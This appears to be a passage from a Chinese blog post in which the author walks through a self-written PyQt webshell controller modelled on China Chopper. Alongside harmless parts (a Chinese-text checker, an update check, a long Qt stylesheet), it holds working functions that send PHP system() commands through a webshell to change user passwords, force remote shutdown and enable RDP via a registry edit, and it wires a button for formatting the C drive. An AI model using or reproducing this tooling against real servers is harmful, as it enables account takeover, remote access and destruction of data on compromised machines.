            phpcode = 'system("net user ' + username + " " + passwd + '" );'  # 组合命令
        if system == "Linux":
            phpcode = 'system("echo ' + username + ":" + passwd + '" | chpasswd);'  # 组合命令
        #print(phpcode)
        returndata = self.sendcode(phpcode)  # 发送命令
        returndata = returndata.decode('gb2312',"ignore")
        #print(returndata)
        #print(returndata[:6])
        #print(type(returndata))
        if returndata[:6] =="命令成功完成":
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "修改成功！")
        else:
            self.dialog.close()
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "没有此用户或没有权限，修改失败！")
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "密码不能为空！")
```

在这个函数中，首先获取用户名，密码，然后判断系统类型，执行命令来修改密码。再把用户名和密码和cmd命令组合起来发送给靶机进行修改密码。

#### 4.强制关机

强制关机函数：

```python
#强制关机按钮
def Shutdown(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        button = QMessageBox.question(self, "警告！",
                                      self.tr("你确定要强制关机吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if button == QMessageBox.Ok:

            shell = self.Ui.shelllabel.text()  # 获取shell
            system = self.systemtype()  # 获取系统类型
            if system == "WINNT":
                phpcode = 'system("shutdown -p");echo(ok);'
            if system == "Linux":
                phpcode = 'system("poweroff");echo(ok);'
            data = self.sendcode(phpcode)
            data = data.decode('utf-8',"ignore")
            #print(data)
            if data!=None:
                if data == "ok":
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "强制关机成功！")
                else:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "强制关机失败！")
            else:
                pass
            #print(data)
        else:
            return
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")   
```

当用户点击此按钮时，获取shell，并弹出警告框“你确定要强制关机吗？”当用户点击确定，则获取系统类型，然后发送强制关机代码，使远程服务器强制关机。

#### 5.开启3389

开启3389调用的函数

```python
#开启3389按钮
def Open3389(self):
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell == "":
        box = QtWidgets.QMessageBox()
        box.warning(self, "提示", "请先连接shell！")
    else:

        system = self.systemtype()  # 获取系统类型
        if system == "WINNT":
            phpcode ='system("REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");'
            result = self.sendcode(phpcode)
            if result !=None:
                data = self.sendcode('system("netstat -ano |findstr 0.0.0.0:3389");')
                data = data.decode('utf-8',"ignore")
                if data !=None:
                    if data!="":
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "开启成功！")
                    else:
                        box = QtWidgets.QMessageBox()
                        box.information(self, "提示", "抱歉，您没有权限！")
                else:
                    return
            else:
                return
        if system == "Linux":
            box = QtWidgets.QMessageBox()
            box.information(self, "提示", "此操作只支持Windows！")
```

同样是获取系统类型，然后发送注册表命令开启3389。

#### 6.中文检测

中文检测代码：

```python
#中文检测
def Chinese(self):
    try:
        os.system("python3 中文符号检测工具.py")
    except:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "模块不存在！")
```

这个是调用的我以前的程序。用tkinter模块写的。以下为中文检测源代码：

```python
import tkinter
import webbrowser
import re

#本程序是一个中文字符和中文检测工具
#中文字符自己添加，我只添加了一点
#输入字符串，点击检查文本即可判断有没有中文字符
# qianxiao996精心制作
#博客地址：https://blog.csdn.net/qq_36374896


win = tkinter.Tk()
win.title("中文字符检测工具   "+"by qianxiao996"+"    -----博客地址：https://blog.csdn.net/qq_36374896 -----")

#获取全部内容
def showInfo():
    returntext.delete(0.0, tkinter.END)   #清空returntext中的内容
    str=text.get(0.0, tkinter.END)    #得到text中的文本
    list=['，','。','：','￥','；','“','‘']  #中文字符可以自行添加
    endstr=""  #存放文本中的特殊字符
    zhPattern = re.compile(u'[\u4e00-\u9fa5]+') #匹配中文的正则表达式
    for i in str:   #遍历整个文本是否含有中文字符
        if i in list:   #遍历是否含有list中的字符
            endstr+=i
        elif zhPattern.search(i):   #遍历是否是汉字
            endstr += i
    if endstr !='':   #输出中文字符
        returntext.insert(tkinter.INSERT, "中文字符："+endstr)
    else:
        returntext.insert(tkinter.INSERT, "恭喜您，文本中没有中文字符")
#清空
def clearText():
    text.delete(0.0, tkinter.END)
    returntext.delete(0.0, tkinter.END)
def click():
    webbrowser.open("https://blog.csdn.net/qq_36374896")

#创建滚动条
scroll = tkinter.Scrollbar()
#height:显示的行数
str = "请在此输入您的文本(请删除此字符串)："
text = tkinter.Text(win,width =80,height = 50,bg='#F0FFFF',fg="#FF00FF")

text.insert(tkinter.INSERT,str)
#side 放到窗体的哪一侧
scroll.pack(side  =tkinter.RIGHT,fill = tkinter.Y)
text.pack(side  =tkinter.LEFT,fill = tkinter.Y,)
#关联
scroll.config(command =text.yview)
text.config(yscrollcommand =scroll.set)
label = tkinter.Label(win,text= " 欢  迎  您  的  使  用 !",bg='#F0F8FF',fg="green").pack(side="bottom",ipady="8",ipadx="44")
zuozhe=tkinter.Button(win,text= "作者主页",command =click,bg='#F0F8FF',fg="green").pack(side="bottom",ipady="30",ipadx="80")
close = tkinter.Button(win,text= "关闭程序",command =win.quit,bg='#F0F8FF',fg="green").pack(side="bottom",ipady="30",ipadx="80")
clear = tkinter.Button(win,text= "清空文本",command = clearText,bg='#F0F8FF',fg="green").pack(side="bottom",ipady="30",ipadx="80")
button = tkinter.Button(win,text= "检查文本",command = showInfo,bg='#F0F8FF',fg="green").pack(side="bottom",ipady="30",ipadx="80")
returntext = tkinter.Text(win,width = 30,height=30,bg='#F0FFFF',foreground='red')
returntext.pack(side="top",ipadx="3")
win.mainloop()
```

#### 7.检查更新

检查更新代码：

```python
#检查更新
def Update(self):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"  # 以表单的形式请求
    }
    url =  'http://127.0.0.1/1.txt'
    req = urllib.request.Request(url,headers=headers)
    # 发起请求
    response = urllib.request.urlopen(req)
    data = (response.read())
    # print(data)
    data = data.decode('utf-8', "ignore")
    if "V5.0" !=data:
        data = QMessageBox.question(self, "检查更新！",
                                      self.tr("您使用的不是最新版本，\n您想要立即更新吗？"),
                                      QMessageBox.Ok | QMessageBox.Cancel,
                                      QMessageBox.Ok)
        if data == QMessageBox.Ok:                                                   
            webbrowser.open("https://github.com/qianxiao996/Python3/tree/master/python%E8%84%9A%E6%9C%AC/Python%20knife")
        else:
            return
    else:
        box = QtWidgets.QMessageBox()
        box.about (self, "检查更新", "当前版本：V5.0\n最新版本："+data+"\n恭喜您,您使用的是最新版本！")
```

这里是直接访问远程服务器的信息，当与本地版本一致则提示“恭喜您,您使用的是最新版本！” 否则，则提示需要更新。

#### 8.联系作者

当点击联系作者的时候会自己打开主页的主页哦

```python
def Loveme(self):
    webbrowser.open("https://blog.csdn.net/qq_36374896")
    box = QtWidgets.QMessageBox()
    box.information (self, "联系作者", "作者邮箱：qianxiao996@126.com\n作者主页：https://blog.csdn.net/qq_36374896")
```

#### 9.其他

程序图标问题，一行代码搞定

```python
self.setWindowIcon(QtGui.QIcon('./img/main.png'))
```

动态显示时间的函数

```python
def showtime(self):  #显示时间
    datetime = QDateTime.currentDateTime()
    text = datetime.toString("yyyy-MM-dd hh:mm:ss")
    self.Ui.timelabel.setText(text)
```

POST请求函数：

```python
# POST请求
def sendPOST(self,shell,phpcode): #发送php请求
   #请求头
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded" #以表单的形式请求
    }
    #print(phpcode)
    #print(shell[0])
    #print(phpcode)

    postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")

    req = urllib.request.Request(shell[0], postData, headers,)

    try:
    # 发起请求
        response = urllib.request.urlopen(req,timeout=0.5)
        data = (response.read())
        #print(data)
        return (data)
    except urllib.error.HTTPError as e:
        return e.code
```

QSS美化代码

```c
/**********菜单**********/
QMenu {
        border: 1px solid rgb(100, 100, 100);
        background: rgb(68, 69, 73);
}
QMenu::item {
        height: 22px;
        padding: 0px 25px 0px 20px;
}
QMenu::item:enabled {
        color: rgb(225, 225, 225);
}
QMenu::item:!enabled {
        color: rgb(155, 155, 155);
}
QMenu::item:enabled:selected {
        color: rgb(230, 230, 230);
        background: rgba(255, 255, 255, 40);
}
QMenu::separator {
        height: 1px;
        background: rgb(100, 100, 100);
}
QMenu::indicator {
        width: 13px;
        height: 13px;
}
QMenu::icon {
        padding-left: 2px;
        padding-right: 2px;
}

/**********页签项**********/

QTabWidget::pane {
      border: none;
      border-top: 3px solid rgb(0, 160, 230);
      background: rgb(57, 58, 60);
}
QTabWidget::tab-bar {
      border: none;


}
QTabBar::tab {
      border: none;
      border-top-left-radius: 4px;
      border-top-right-radius: 4px;
      color: rgb(175, 175, 175);
      background: rgb(255, 255, 255, 30);
      height: 28px;
      min-width: 85px;
      margin-right: 5px;
      padding-left: 5px;
      padding-right: 5px;
}
QTabBar::tab:hover {
      background: rgb(255, 255, 255, 40);
}
/********标签白色蓝底*****/
QTabBar::tab:selected {
      color: white;
      background: rgb(0, 160, 230);
}




/**********表头**********/
QHeaderView{
        border: none;
        background: rgb(57, 58, 60);
        min-height: 30px;
}
QHeaderView::section:horizontal {
        border: none;
        color: white;
        background: transparent;
        padding-left: 5px;
}


/**********表格**********/
QTableView {
        border: 1px solid rgb(45, 45, 45);
        background: rgb(57, 58, 60);
        gridline-color: rgb(60, 60, 60);
        color: green;
}
QTableView::item {
        padding-left: 5px;
        padding-right: 5px;
        border: none;
        background: rgb(72, 72, 74);
        border-right: 1px solid rgb(45, 45, 45);
        border-bottom: 1px solid rgb(45, 45, 45);
}
/**********表格选中颜色**********/
QTableView::item:selected {
        background: rgba(0, 0, 0, 0);
}
QTableView::item:selected:!active {
        color: white;
}

QTableView::indicator {
        width: 20px;
        height: 20px;
}

/**********滚动条-水平**********/
QScrollBar:horizontal {
        height: 20px;
        background: transparent;
        margin-top: 3px;
        margin-bottom: 3px;
}
QScrollBar::handle:horizontal {
        height: 20px;
        min-width: 30px;
        background: rgb(68, 69, 73);
        margin-left: 15px;
        margin-right: 15px;
}
QScrollBar::handle:horizontal:hover {
        background: rgb(80, 80, 80);
}
QScrollBar::sub-line:horizontal {
        width: 15px;
        background: transparent;
        subcontrol-position: left;
}
QScrollBar::add-line:horizontal {
        width: 15px;
        background: transparent;
        subcontrol-position: right;
}
QScrollBar::sub-line:horizontal:hover {
        background: rgb(68, 69, 73);
}
QScrollBar::add-line:horizontal:hover {
        background: rgb(68, 69, 73);
}
QScrollBar::add-page:horizontal,QScrollBar::sub-page:horizontal {
        background: transparent;
}

/**********滚动条-垂直**********/
QScrollBar:vertical {
        width: 20px;
        background: transparent;
        margin-left: 3px;
        margin-right: 3px;
}
QScrollBar::handle:vertical {
        width: 20px;
        min-height: 30px;
        background: rgb(255, 255, 240);
        margin-top: 15px;
        margin-bottom: 15px;
}

QScrollBar::sub-line:vertical {
        height: 15px;
        background: transparent;
        subcontrol-position: top;
}
QScrollBar::add-line:vertical {
        height: 15px;
        background: transparent;
        subcontrol-position: bottom;
}
QScrollBar::sub-line:vertical:hover {
        background: rgb(68, 69, 73);
}
QScrollBar::add-line:vertical:hover {
        background: rgb(68, 69, 73);
}
QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
        background: transparent;
}

QScrollBar#verticalScrollBar:vertical {
        margin-top: 30px;
}


/**********单选框**********/
QRadioButton{
        spacing: 5px;
}
QRadioButton:enabled{
        color: rgb(175, 175, 175);
}
QRadioButton:enabled:hover{
        color: rgb(200, 200, 200);
}
QRadioButton:!enabled{
        color: rgb(155, 155, 155);
}
QRadioButton::indicator {
        width: 15px;
        height: 15px;
}


/**********输入框**********/
QLineEdit {
        border-radius: 4px;
        height: 25px;
        border: 1px solid rgb(100, 100, 100);
        background: rgb(72, 72, 73);
}
QLineEdit:enabled {
        color: rgb(175, 175, 175);
}
QLineEdit:enabled:hover, QLineEdit:enabled:focus {
        color: rgb(230, 230, 230);
}
QLineEdit:!enabled {
        color: rgb(155, 155, 155);
}



/**********微调器**********/
QSpinBox {
        border-radius: 4px;
        height: 24px;
        min-width: 40px;
        border: 1px solid rgb(100, 100, 100);
        background: rgb(68, 69, 73);
}
QSpinBox:enabled {
        color: rgb(220, 220, 220);
}
QSpinBox:enabled:hover, QLineEdit:enabled:focus {
        color: rgb(230, 230, 230);
}
QSpinBox:!enabled {
        color: rgb(65, 65, 65);
        background: transparent;
}
QSpinBox::up-button {
        width: 18px;
        height: 12px;
        border-top-right-radius: 4px;
        border-left: 1px solid rgb(100, 100, 100);
        background: rgb(50, 50, 50);
}
QSpinBox::up-button:!enabled {
        border-left: 1px solid gray;
        background: transparent;
}
QSpinBox::up-button:enabled:hover {
        background: rgb(255, 255, 255, 30);
}
QSpinBox::down-button {
        width: 18px;
        height: 12px;
        border-bottom-right-radius: 4px;
        border-left: 1px solid rgb(100, 100, 100);
        background: rgb(50, 50, 50);
}
QSpinBox::down-button:!enabled {
        border-left: 1px solid gray;
        background: transparent;
}
QSpinBox::down-button:enabled:hover {
        background: rgb(255, 255, 255, 30);
}

/**********标签**********/
QLabel#grayLabel {
        color: rgb(220, 20, 60);
}

QLabel#highlightLabel {
        color: rgb(175, 175, 175);
}

QLabel#redLabel {
        color: red;
}

QLabel#grayYaHeiLabel {
        color: rgb(175, 175, 175);
        font-size: 16px;
}

QLabel#blueLabel {
        color: rgb(0, 160, 230);
}

QLabel#listLabel {
        color: rgb(220, 160, 230);

}

QLabel#lineBlueLabel {
        background: rgb(0, 160, 230);
}

QLabel#graySeperateLabel {
        background: rgb(45, 45, 45);
}

QLabel#seperateLabel {
        background: rgb(80, 80, 80);
}

QLabel#radiusBlueLabel {
      border-radius: 15px;
      color: white;
      font-size: 16px;
      background: rgb(0, 160, 230);
}

QLabel#skinLabel[colorProperty="normal"] {
      color: rgb(175, 175, 175);
}
QLabel#skinLabel[colorProperty="highlight"] {
      color: rgb(0, 160, 230);
}

QLabel#groupLabel {
      color: rgb(0, 160, 230);
      border: 1px solid rgb(0, 160, 230);
      font-size: 15px;
      border-top-color: transparent;
      border-right-color: transparent;
      border-left-color: transparent;
}

/**********按钮**********/
QToolButton#nsccButton{
      border: none;
      color: rgb(175, 175, 175);
      background: transparent;
      padding: 10px;
      qproperty-icon: url(:/Black/nscc);
      qproperty-iconSize: 32px 32px;
      qproperty-toolButtonStyle: ToolButtonTextUnderIcon;
}
QToolButton#nsccButton:hover{
      color: rgb(217, 218, 218);
      background: rgb(255, 255, 255, 20);
}

QToolButton#transferButton{
      border: none;
      color: rgb(175, 175, 175);
      background: transparent;
      padding: 10px;
      qproperty-icon: url(:/Black/transfer);
      qproperty-iconSize: 32px 32px;
      qproperty-toolButtonStyle: ToolButtonTextUnderIcon;
}
QToolButton#transferButton:hover{
      color: rgb(217, 218, 218);
      background: rgb(255, 255, 255, 20);
}

/**********按钮**********/
QPushButton{
      border-radius: 4px;
      border: none;
      width: 75px;
      height: 25px;
}
QPushButton:enabled {
        background: rgb(68, 69, 73);
        color: white;
}
QPushButton:!enabled {
        background: rgb(100, 100, 100);
        color: rgb(200, 200, 200);
}
QPushButton:enabled:hover{
        background: rgb(85, 85, 85);
}
QPushButton:enabled:pressed{
        background: rgb(80, 80, 80);
}


QPushButton#blueButton:enabled {
        background: rgb(0, 165, 235);
        color: white;
}
QPushButton#blueButton:!enabled {
        background: gray;
        color: rgb(200, 200, 200);
}
QPushButton#blueButton:enabled:hover {
        background: rgb(0, 180, 255);
}
QPushButton#blueButton:enabled:pressed {
        background: rgb(0, 140, 215);
}

QPushButton#selectButton {
        border: none;
        border-radius: none;
        border-left: 1px solid rgb(100, 100, 100);
        background: transparent;
        color: white;
}
QPushButton#selectButton:enabled:hover{
        background: rgb(85, 85, 85);
}
QPushButton#selectButton:enabled:pressed{
        background: rgb(80, 80, 80);
}

QPushButton#linkButton {
        background: transparent;
        color: rgb(0, 160, 230);
        text-align:left;
}
QPushButton#linkButton:hover {
        color: rgb(20, 185, 255);
        text-decoration: underline;
}
QPushButton#linkButton:pressed {
        color: rgb(0, 160, 230);
}

QPushButton#transparentButton {
        background: transparent;
}

/**********文本编辑框**********/
QTextEdit {
        border: 1px solid rgb(45, 45, 45);
        color: green;
        background: rgb(57, 58, 60);
}

/* === QListView === */
QListView {
    background: rgb(57, 58, 60);
    color: yellow;
}


/* === QTreeView === */
QTreeView{
    background: rgb(57, 58, 60);
    color: green;
}

QTreeView::item:hover {
    background: #333333;
}

QTreeView::item:selected {
    background: #111111;
    color: yellow;
}
```

## 0x04总结

完整代码在附件。菜刀文件写了1500行代码，中文检测50多行代码，再加上各个ui生成的代码大约700多行，总共大约2200行代码吧，中间遇到许多问题，靠自己百度突破，收获很大，很有成就感。学习路还长，加油。
到这里想写的功能都写完了，其他代码在附件中！

## 0x05参考文章

网络上的教程大部分都是c++QT的pyqt的真的少。。。。

Pyqt Python GUI 入门教程
​	https://max.book118.com/html/2018/0805/8004075040001117.shtm
州的先生系列教程
​	https://zmister.com/archives/category/guidevelop/pyqt5_basic
吴秦（Tyler）
​	https://www.cnblogs.com/skynet/p/4229556.html
资料汇总
​	http://www.cnblogs.com/txw1958/archive/2011/12/18/2291928.html

## 0x06附件

初始化函数

```python
super(MainWindows,self).__init__(parent)
#self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint) #去掉标题栏
self.Ui = Ui_MainWindow()
self.Ui.setupUi(self)
self.setWindowIcon(QtGui.QIcon('./img/main.png'))
self.setFixedSize(self.width(), self.height()) #设置宽高不可变
self.Ui.exit.clicked.connect(QtCore.QCoreApplication.instance().quit)  #退出
self.timer = QTimer()  #设定一个定时器用来显示时间
self.timer.timeout.connect(self.showtime)
self.timer.start()

self.readshellfile()  #加载文件到tableweight
self.Ui.treeWidget.doubleClicked.connect(self.displayfile) #treeweight双击
self.Ui.treeWidget_2.doubleClicked.connect(self.intodisplay)  # treeweight_2双击
self.Ui.savejiaoben.clicked.connect(self.SaveJiaoben)  #保存脚本
self.Ui.clearjiaoben.clicked.connect(self.ClearJiaoben) #清空脚本
self.Ui.zairujiaoben.clicked.connect(self.ZairuJiaoben)  # 载入脚本
self.Ui.gojiaoben.clicked.connect(self.ZhixingJiaoben)  # 执行脚本
self.Ui.sql_peizhi.clicked.connect(self.Sql_peizhi_show)  # sql配置按钮
self.Ui.sql_zhixing.clicked.connect(self.Sql_ok)  # sql语句执行


self.Ui.user.clicked.connect(self.User)  #查询用户
self.Ui.adduser.clicked.connect(self.useraddshow)#添加用户按钮
self.Ui.passwd.clicked.connect(self.changepasswdshow)  # 修改密码
self.Ui.shutdown.clicked.connect(self.Shutdown)  #强制关机
self.Ui.format.clicked.connect(self.Format)  #格式化C盘
self.Ui.open3389.clicked.connect(self.Open3389)  # 开启3389
self.Ui.chinese.clicked.connect(self.Chinese) #中文检测
self.Ui.update.clicked.connect(self.Update)  #检查更新
self.Ui.loveme.clicked.connect(self.Loveme)  #联系作者

self.Ui.textEdit.installEventFilter(self)  # textedit 事件过滤器，enter执行命令

#文件操作右键菜单
self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.treeWidget_2.customContextMenuRequested['QPoint'].connect(self.fileContextMenu)
#shell管理右键菜单
self.Ui.tableWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.tableWidget.customContextMenuRequested['QPoint'].connect(self.createContextMenu)
#历史命令右键菜单
self.Ui.history.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.history.customContextMenuRequested['QPoint'].connect(self.createhistoryMenu)
#虚拟终端右键菜单
self.Ui.textEdit.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.textEdit.customContextMenuRequested['QPoint'].connect(self.createtextEditMenu)

#设置表格属性  列宽度
self.Ui.tableWidget.setColumnWidth(0, 335)
self.Ui.tableWidget.setColumnWidth(1, 60)
self.Ui.tableWidget.setColumnWidth(2, 50)
self.Ui.tableWidget.setColumnWidth(3, 140)
self.Ui.tableWidget.setColumnWidth(4, 45)
self.Ui.tableWidget.setColumnWidth(5, 139)
#设置树形控件  列宽度
self.Ui.treeWidget_2.setColumnWidth(0, 220)
self.Ui.treeWidget_2.setColumnWidth(1, 180)
self.Ui.treeWidget_2.setColumnWidth(2, 60)
self.Ui.treeWidget_2.setColumnWidth(3, 60)
```


POST请求函数

```python
# POST请求
def sendPOST(self,shell,phpcode): #发送php请求
   #请求头
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded" #以表单的形式请求
    }
    #print(phpcode)
    #print(shell[0])
    #print(phpcode)

    postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")

    req = urllib.request.Request(shell[0], postData, headers,)

    try:
    # 发起请求
        response = urllib.request.urlopen(req,timeout=0.5)
        data = (response.read())
        #print(data)
        return (data)
    except urllib.error.HTTPError as e:
        return e.code
```

Pyqt的源文件我也放在里面了，你们可以尽情修改。注释的话，我感觉已经特别详细了。不多解释了，自己看吧。

qianxiao996 ----- 一名什么也不精通的白帽子。

博客地址：https://me.csdn.net/qq_36374896





